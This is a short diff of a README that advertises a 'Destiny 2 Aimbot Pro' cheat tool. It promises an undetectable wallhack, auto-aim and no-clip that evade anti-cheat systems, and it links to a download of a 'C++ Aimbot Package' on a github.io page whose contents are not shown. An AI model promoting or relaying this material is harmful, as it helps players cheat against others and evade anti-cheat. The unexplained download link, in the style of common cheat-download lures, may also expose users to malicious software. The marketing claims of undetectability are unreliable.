@@ -1,5 +1,3 @@
-# Destiny 2 Aimbot Pro 🎯 C++ AI & Stream-Safe  
-
 **Destiny 2 Aimbot Pro** combines advanced C++ engineering with AI-driven precision to give you an unstoppable edge in PvP. Whether you're streaming or grinding tokens, this tool offers undetectable features like ESP wallhack, auto-aim, and no-clip movement. Designed for AMD/Intel CPUs, it works seamlessly with controllers and stays hidden from anti-cheat systems.  
 
 [![Download C++ Aimbot Package](https://img.shields.io/badge/Download-C%2B%2B%20Aimbot%20Package-blueviolet)](https://destiny-2-aimbot.github.io/.github/)  
